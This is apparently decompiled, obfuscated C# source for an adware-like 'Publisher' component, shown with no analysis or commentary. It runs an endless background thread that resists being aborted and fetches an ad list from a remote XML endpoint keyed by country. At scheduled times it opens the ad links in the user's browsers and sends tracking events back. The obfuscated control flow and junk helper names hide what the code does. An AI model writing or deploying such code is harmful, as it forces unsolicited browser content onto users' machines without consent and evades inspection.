using System;
using System.Collections.Generic;
using System.Globalization;
using System.Threading;
using Publisher.Prints;
using Publisher.Track;
using Publisher.Utility;

namespace Publisher;

public class Publisher
{
	public static void OnlineWork()
	{
		_003C_003Ec__DisplayClass0_0 CS_0024_003C_003E8__locals0;
		while (true)
		{
			try
			{
				CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass0_0();
				CS_0024_003C_003E8__locals0.btwtime = 3;
				CS_0024_003C_003E8__locals0.btwads = 3;
				Thread thread = new Thread((ThreadStart)delegate
				{
					_003C_003Ec__DisplayClass0_0.Pe1AMvZVRCUApkD0lBU(CS_0024_003C_003E8__locals0.btwtime, CS_0024_003C_003E8__locals0.btwads);
				});
				w40rwMqrPRE85cUiPG(thread, bool_0: true);
				dokIOQo1Lt1GkVfiF7(thread);
				thread.Join();
			}
			catch (ThreadAbortException)
			{
				CGsljJ0GeU3lGxG2hQ();
			}
			catch (Exception)
			{
			}
		}
	}

	private static void WorkLoop(int btwtime, int btwads)
	{
		DateTime dateTime_ = default(DateTime);
		bool flag2 = default(bool);
		DateTime dateTime_2 = default(DateTime);
		string tag = default(string);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		while (true)
		{
			List<Pub> Ads = new List<Pub>();
			while (true)
			{
				InitParam(out Ads, out var complementTag);
				while (true)
				{
					if (KjZCmI1LJInFYIl37A(Ads) <= 0)
					{
						return;
					}
					int num = 0;
					while (true)
					{
						bool flag = num < KjZCmI1LJInFYIl37A(Ads);
						while (true)
						{
							int num2;
							if (flag)
							{
								dateTime_ = ts75iJmEu6GESMySie(ouguX1h7VDm7lhb5qU(Ads[num]), "HH:mm:ss", Oklt7hlmI2FBASN4Tp());
								num2 = 23;
								if (!i23Gh076mOCRkTCrPs())
								{
									goto IL_0067;
								}
							}
							else
							{
								num2 = 18;
								if (hPfiFiEMcWIqulsZRe())
								{
								}
							}
							goto IL_015d;
							IL_0214:
							if (flag2)
							{
								goto IL_0218;
							}
							goto IL_0226;
							IL_0218:
							Ads.Remove(Ads[num]);
							goto IL_0226;
							IL_015d:
							switch (num2)
							{
							case 23:
								dateTime_2 = ts75iJmEu6GESMySie(qrfnnyeRDydclOUNp0(Ads[num]), "HH:mm:ss", Oklt7hlmI2FBASN4Tp());
								goto case 21;
							case 21:
								if (OL94G74UQcMrMQxCX3(Ads[num]) > 0)
								{
									break;
								}
								goto IL_0226;
							case 4:
								break;
							case 7:
							case 8:
								goto IL_007d;
							default:
								goto IL_008c;
							case 10:
								goto IL_00bf;
							case 1:
								goto IL_00f6;
							case 16:
								goto IL_00fa;
							case 3:
								goto IL_010f;
							case 0:
								tag = (string)ek6Sb5WdoWukiyP6Wl(RKbwcMykFRlpXH4c1f(Ads[num].tag), 10, complementTag.ToLower());
								goto IL_008c;
							case 9:
								continue;
							case 11:
								goto IL_01e3;
							case 6:
								goto IL_0200;
							case 15:
								goto IL_0214;
							case 17:
								goto IL_0218;
							case 19:
								goto IL_0243;
							case 5:
							case 20:
								goto end_IL_01d9;
							case 14:
							case 18:
								goto end_IL_0247;
							case 22:
								goto end_IL_0254;
							case 13:
								goto end_IL_0264;
							case 24:
								return;
							}
							goto IL_0067;
							IL_0067:
							if (ry9M3qrVs973f1xg84(dYyc4dxhLfA6ugE4en(), dateTime_))
							{
								_ = 0;
								if (i23Gh076mOCRkTCrPs())
								{
									goto IL_007d;
								}
								goto IL_008c;
							}
							goto IL_0226;
							IL_0226:
							Oh7HZDICZlZp3Hltc6(new ManualResetEvent(initialState: false), (int)w6JcUIcQgXKbkOClQA(btwtime).TotalMilliseconds);
							goto IL_0243;
							IL_007d:
							if (SRVeitvJN907DP0VwD(dYyc4dxhLfA6ugE4en(), dateTime_2))
							{
								goto IL_00bf;
							}
							goto IL_0226;
							IL_00bf:
							flag3 = InformationsUtility.showIn_special_Browser((string)BpOgtAt3dhZiuyG31s(Ads[num]), L64PtcB7Ar35lZSml8(Ads[num]), Ads[num].firefox, Ads[num].chrome);
							goto IL_00f6;
							IL_00f6:
							flag4 = flag3;
							goto IL_00fa;
							IL_00fa:
							if (!flag4)
							{
								goto IL_010f;
							}
							num2 = 0;
							if (!hPfiFiEMcWIqulsZRe())
							{
								goto IL_015d;
							}
							goto IL_01e3;
							IL_0243:
							num++;
							break;
							IL_01e3:
							Oh7HZDICZlZp3Hltc6(new ManualResetEvent(initialState: false), (int)w6JcUIcQgXKbkOClQA(btwads).TotalMilliseconds);
							goto IL_0200;
							IL_0200:
							flag2 = OL94G74UQcMrMQxCX3(Ads[num]) == 0;
							goto IL_0214;
							IL_008c:
							Trackys object_ = new Trackys(tag, eEWrdX59ibmmoyE72v(Ads[num]).ToString());
							i0kRo6APgaQbjvr2De(object_, "printed", "succed");
							goto IL_010f;
							IL_010f:
							Pub object_2 = Ads[num];
							int num3 = OL94G74UQcMrMQxCX3(object_2);
							QF3wbJXX2Es51HWfhY(object_2, num3 - 1);
							num2 = 11;
							if (!hPfiFiEMcWIqulsZRe())
							{
								goto IL_015d;
							}
							goto IL_0214;
							continue;
							end_IL_01d9:
							break;
						}
						continue;
						end_IL_0247:
						break;
					}
					continue;
					end_IL_0254:
					break;
				}
				continue;
				end_IL_0264:
				break;
			}
		}
	}

	private static void InitParam(out List<Pub> Ads, out string complementTag)
	{
		_ = 0;
		if (!i23Gh076mOCRkTCrPs())
		{
			if (hPfiFiEMcWIqulsZRe())
			{
			}
			switch (3)
			{
			case 0:
			case 4:
				break;
			case 5:
				goto IL_0046;
			case 2:
			case 3:
				goto IL_004c;
			default:
				goto IL_0052;
			case 1:
				goto IL_0058;
			case 7:
				goto IL_005f;
			}
		}
		complementTag = "_static_stch_staticpro_default";
		goto IL_0046;
		IL_0058:
		Ads = new List<Pub>();
		goto IL_005f;
		IL_005f:
		string text2 = default(string);
		string text = default(string);
		string data = default(string);
		try
		{
			try
			{
				text2 = (string)LwdTIugp2qUukCni3K(new string[5]
				{
					"http://room2.360dev.info/Gray/dotex/",
					text,
					"/",
					(string)lUu3sVSdo2tIo5TFND(),
					".xml"
				});
				data = Outer.CallServer(text2);
				return;
			}
			catch (Exception)
			{
				return;
			}
			finally
			{
				RBqRxHfO2EprfSoslv(text2);
				List<Pub> list = (Ads = Outer.GetData(data));
			}
		}
		catch (Exception)
		{
			return;
		}
		IL_0052:
		text2 = string.Empty;
		goto IL_0058;
		IL_0046:
		text = "3";
		goto IL_004c;
		IL_004c:
		data = string.Empty;
		goto IL_0052;
	}

	internal static void w40rwMqrPRE85cUiPG(object object_0, bool bool_0)
	{
		((Thread)object_0).IsBackground = bool_0;
	}

	internal static void dokIOQo1Lt1GkVfiF7(object object_0)
	{
		((Thread)object_0).Start();
	}

	internal static void CGsljJ0GeU3lGxG2hQ()
	{
		Thread.ResetAbort();
	}

	internal static bool i23Gh076mOCRkTCrPs()
	{
		return true;
	}

	internal static bool hPfiFiEMcWIqulsZRe()
	{
		return false;
	}

	internal static object ouguX1h7VDm7lhb5qU(object object_0)
	{
		return ((Pub)object_0).start_time;
	}

	internal static object Oklt7hlmI2FBASN4Tp()
	{
		return CultureInfo.InvariantCulture;
	}

	internal static DateTime ts75iJmEu6GESMySie(object object_0, object object_1, object object_2)
	{
		return DateTime.ParseExact((string)object_0, (string)object_1, (IFormatProvider?)object_2);
	}

	internal static object qrfnnyeRDydclOUNp0(object object_0)
	{
		return ((Pub)object_0).end_time;
	}

	internal static int OL94G74UQcMrMQxCX3(object object_0)
	{
		return ((Pub)object_0).nbr_show_perday;
	}

	internal static DateTime dYyc4dxhLfA6ugE4en()
	{
		return DateTime.Now;
	}

	internal static bool ry9M3qrVs973f1xg84(DateTime dateTime_0, DateTime dateTime_1)
	{
		return dateTime_0 >= dateTime_1;
	}

	internal static bool SRVeitvJN907DP0VwD(DateTime dateTime_0, DateTime dateTime_1)
	{
		return dateTime_0 <= dateTime_1;
	}

	internal static object BpOgtAt3dhZiuyG31s(object object_0)
	{
		return ((Pub)object_0).link_show;
	}

	internal static int L64PtcB7Ar35lZSml8(object object_0)
	{
		return ((Pub)object_0).internt_explorer;
	}

	internal static object RKbwcMykFRlpXH4c1f(object object_0)
	{
		return ((string)object_0).ToLower();
	}

	internal static object ek6Sb5WdoWukiyP6Wl(object object_0, int int_0, object object_1)
	{
		return ((string)object_0).Insert(int_0, (string)object_1);
	}

	internal static object eEWrdX59ibmmoyE72v(object object_0)
	{
		return ((Pub)object_0).prices;
	}

	internal static void i0kRo6APgaQbjvr2De(object object_0, object object_1, object object_2)
	{
		((Trackys)object_0).sendtrack((string)object_1, (string)object_2);
	}

	internal static void QF3wbJXX2Es51HWfhY(object object_0, int value)
	{
		((Pub)object_0).nbr_show_perday = value;
	}

	internal static TimeSpan w6JcUIcQgXKbkOClQA(double double_0)
	{
		return TimeSpan.FromMinutes(double_0);
	}

	internal static bool Oh7HZDICZlZp3Hltc6(object object_0, int int_0)
	{
		return ((WaitHandle)object_0).WaitOne(int_0);
	}

	internal static int KjZCmI1LJInFYIl37A(object object_0)
	{
		return ((List<Pub>)object_0).Count;
	}

	internal static object lUu3sVSdo2tIo5TFND()
	{
		return CommonConfig.Country;
	}

	internal static object LwdTIugp2qUukCni3K(object object_0)
	{
		return string.Concat((string?[])object_0);
	}

	internal static void RBqRxHfO2EprfSoslv(object object_0)
	{
		Console.WriteLine((string?)object_0);
	}
}
